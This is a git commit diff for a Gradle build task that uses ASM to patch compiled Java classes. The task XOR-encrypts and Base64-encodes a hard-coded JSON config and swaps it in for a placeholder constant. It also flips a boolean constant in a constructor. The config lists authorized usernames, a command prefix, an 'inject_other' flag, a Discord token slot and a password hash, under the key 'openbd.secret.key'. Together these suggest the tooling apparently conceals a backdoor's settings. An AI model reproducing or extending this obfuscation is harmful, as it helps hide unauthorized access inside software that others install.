1622d6207a4daacc56343d8e254381349327790e
Kudo <tmquan2508@gmail.com>
2025-09-12 23:00:05 +0200

    feat: Implement JSON blob configuration injection

--- buildSrc/src/main/groovy/com/tmquan2508/gradle/InjectConfig.groovy
+++ buildSrc/src/main/groovy/com/tmquan2508/gradle/InjectConfig.groovy
@@ -1,5 +1,6 @@
 package com.tmquan2508.gradle
 
+import groovy.json.JsonOutput
 import org.gradle.api.DefaultTask
 import org.gradle.api.file.DirectoryProperty
 import org.gradle.api.provider.Property
@@ -9,8 +10,10 @@ import org.gradle.api.tasks.OutputDirectory
 import org.gradle.api.tasks.TaskAction
 import org.objectweb.asm.ClassReader
 import org.objectweb.asm.ClassWriter
+import org.objectweb.asm.Opcodes
 import org.objectweb.asm.tree.AbstractInsnNode
 import org.objectweb.asm.tree.ClassNode
+import org.objectweb.asm.tree.InsnNode
 import org.objectweb.asm.tree.LdcInsnNode
 import org.objectweb.asm.tree.MethodNode
 
@@ -21,6 +24,7 @@ import java.util.Base64
 abstract class InjectConfig extends DefaultTask {
 
     private static final String SECRET_KEY = "openbd.secret.key"
+    private static final String CONFIG_PLACEHOLDER = "::CONFIG::"
 
     @InputDirectory
     abstract DirectoryProperty getClassesDir()
@@ -31,22 +35,20 @@ abstract class InjectConfig extends DefaultTask {
     @Input
     abstract Property<String> getTargetClass()
 
-    private static final Map<String, String> REPLACEMENT_MAP = [
-            "::UUIDS::"        : "",
-            "::USERNAMES::"    : "Kudo,Vdung",
-            "::PREFIX::"       : "!",
-            "::INJECT_OTHER::" : "true",
-            "::WARNINGS::"     : "true",
-            "::DISCORD_TOKEN::": "",
-            "::PASSWORD::"     : "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5",
-            "::TRUE::"         : "true"
+    private static final Map<String, Object> CONFIG_DATA = [
+            "uuids"        : "",
+            "usernames"    : "Kudo,Vdung",
+            "prefix"       : "!",
+            "inject_other" : true,
+            "warnings"     : false,
+            "discord_token": "",
+            "password"     : "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5"
     ]
 
     byte[] xorEncrypt(String input) {
         byte[] inputBytes = input.getBytes("UTF-8")
         byte[] keyBytes = SECRET_KEY.getBytes("UTF-8")
         byte[] outputBytes = new byte[inputBytes.length]
-
         for (int i = 0; i < inputBytes.length; i++) {
             outputBytes[i] = (byte) (inputBytes[i] ^ keyBytes[i % keyBytes.length])
         }
@@ -67,6 +69,11 @@ abstract class InjectConfig extends DefaultTask {
         }
 
         logger.lifecycle("-> Starting value injection task.")
+
+        String configJson = JsonOutput.toJson(CONFIG_DATA)
+        byte[] xorBytes = xorEncrypt(configJson)
+        String finalEncryptedVal = Base64.getEncoder().encodeToString(xorBytes)
+        boolean debugFlagValue = CONFIG_DATA.get("warnings") as boolean
 
         String targetPath = targetClassName.replace('.', '/') + ".class"
         Path inPath = classesDirFile.toPath().resolve(targetPath)
@@ -89,18 +96,23 @@ abstract class InjectConfig extends DefaultTask {
             mn.instructions?.each { AbstractInsnNode insn ->
                 if (insn instanceof LdcInsnNode) {
                     def cst = (insn as LdcInsnNode).cst
-                    if (cst instanceof String) {
-                        String s = (String) cst
-                        if (REPLACEMENT_MAP.containsKey(s)) {
-                            String originalVal = REPLACEMENT_MAP.get(s)
-                            
-                            byte[] xorBytes = xorEncrypt(originalVal)
-                            String finalEncryptedVal = Base64.getEncoder().encodeToString(xorBytes)
-                            
-                            logger.lifecycle("  [LDC] in ${cn.name}.${mn.name}${mn.desc} -> replacing constant: '${s}' -> '${finalEncryptedVal}' (XOR + Base64 encrypted)")
-                            (insn as LdcInsnNode).cst = finalEncryptedVal
-                            changed = true
-                        }
+                    if (cst instanceof String && cst == CONFIG_PLACEHOLDER) {
+                        logger.lifecycle("  [LDC] in ${cn.name}.${mn.name}${mn.desc} -> replacing '${cst}' with encrypted JSON blob.")
+                        (insn as LdcInsnNode).cst = finalEncryptedVal
+                        changed = true
+                    }
+                }
+            }
+
+            if (mn.name == "<init>" && debugFlagValue) {
+                def instructions = mn.instructions
+                for (int i = 0; i < instructions.size(); i++) {
+                    def insn = instructions.get(i)
+                    if (insn.getOpcode() == Opcodes.ICONST_0) {
+                        logger.lifecycle("  [OPCODE] in ${cn.name}.${mn.name}${mn.desc} -> replacing ICONST_0 with ICONST_1.")
+                        instructions.set(insn, new InsnNode(Opcodes.ICONST_1))
+                        changed = true
+                        break
                     }
                 }
             }
